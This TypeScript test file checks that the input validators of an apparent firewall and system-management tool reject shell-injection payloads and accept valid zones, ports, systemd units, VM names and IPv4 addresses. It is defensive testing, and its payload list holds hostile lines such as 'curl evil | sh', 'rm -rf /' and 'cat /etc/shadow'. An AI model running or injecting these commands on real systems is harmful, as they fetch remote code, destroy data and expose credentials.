// src/utils/__tests__/validators.test.ts

import { Validators } from '../validators';

// A representative set of shell-injection / argument-injection payloads that
// must be rejected by every strict validator.
const INJECTION_PAYLOADS = [
  '80; curl evil | sh',
  '80/tcp --permanent; rm -rf /',
  'public && reboot',
  '$(reboot)',
  '`reboot`',
  'zone|cat /etc/shadow',
  'a\nb',
  '-x',            // leading dash → would be read as an option
  '',              // empty
];

describe('Validators — injection payloads are rejected', () => {
  for (const payload of INJECTION_PAYLOADS) {
    it(`rejects ${JSON.stringify(payload)} everywhere`, () => {
      expect(Validators.isZone(payload)).toBe(false);
      expect(Validators.isPort(payload)).toBe(false);
      expect(Validators.isProtocol(payload)).toBe(false);
      expect(Validators.isFirewallService(payload)).toBe(false);
      expect(Validators.isSystemdUnit(payload)).toBe(false);
      expect(Validators.isVmName(payload)).toBe(false);
      expect(Validators.isIPv4(payload)).toBe(false);
    });
  }
});

describe('Validators — valid values are accepted', () => {
  it('accepts zones', () => {
    expect(Validators.isZone('public')).toBe(true);
    expect(Validators.isZone('home')).toBe(true);
    expect(Validators.isZone('docker_0-x')).toBe(true);
  });

  it('accepts ports and ranges within 1-65535', () => {
    expect(Validators.isPort('80')).toBe(true);
    expect(Validators.isPort('47984')).toBe(true);
    expect(Validators.isPort('8000-8100')).toBe(true);
    expect(Validators.isPort('65535')).toBe(true);
    expect(Validators.isPort('0')).toBe(false);         // below range
    expect(Validators.isPort('70000')).toBe(false);     // above range
    expect(Validators.isPort('80/tcp')).toBe(false);
  });

  it('accepts protocols', () => {
    expect(Validators.isProtocol('tcp')).toBe(true);
    expect(Validators.isProtocol('udp')).toBe(true);
    expect(Validators.isProtocol('TCP')).toBe(false);
    expect(Validators.isProtocol('sctp')).toBe(false);
  });

  it('accepts firewall service names', () => {
    expect(Validators.isFirewallService('ssh')).toBe(true);
    expect(Validators.isFirewallService('samba-client')).toBe(true);
    expect(Validators.isFirewallService('http.2')).toBe(true);
  });

  it('accepts interface names incl. VLAN/alias/systemd forms', () => {
    expect(Validators.isInterface('enp5s0.835')).toBe(true);
    expect(Validators.isInterface('ppp0')).toBe(true);
    expect(Validators.isInterface('localBridge')).toBe(true);
    expect(Validators.isInterface('eth0:1')).toBe(true);
    expect(Validators.isInterface('a b')).toBe(false);
  });

  it('accepts systemd units with a valid type suffix', () => {
    expect(Validators.isSystemdUnit('docker.service')).toBe(true);
    expect(Validators.isSystemdUnit('foo@bar.socket')).toBe(true);
    expect(Validators.isSystemdUnit('mnt-data.mount')).toBe(true);
    expect(Validators.isSystemdUnit('docker')).toBe(false);        // no suffix
    expect(Validators.isSystemdUnit('evil.service; reboot')).toBe(false);
  });

  it('accepts VM names but rejects option-like values', () => {
    expect(Validators.isVmName('Windows')).toBe(true);
    expect(Validators.isVmName('win-10.vm')).toBe(true);
    expect(Validators.isVmName('--all')).toBe(false);
  });

  it('accepts valid IPv4 and rejects out-of-range octets', () => {
    expect(Validators.isIPv4('192.168.3.2')).toBe(true);
    expect(Validators.isIPv4('10.0.0.255')).toBe(true);
    expect(Validators.isIPv4('256.1.1.1')).toBe(false);
    expect(Validators.isIPv4('1.2.3')).toBe(false);
    expect(Validators.isIPv4('1.2.3.4.5')).toBe(false);
  });

  it('isConfigSafeLine rejects control characters (config-file corruption)', () => {
    expect(Validators.isConfigSafeLine('MyNetwork')).toBe(true);
    expect(Validators.isConfigSafeLine('pass word 123')).toBe(true);
    expect(Validators.isConfigSafeLine('ssid\ninjected=1')).toBe(false);
    expect(Validators.isConfigSafeLine('a\tb')).toBe(false);
    expect(Validators.isConfigSafeLine('a\x00b')).toBe(false);
  });
});
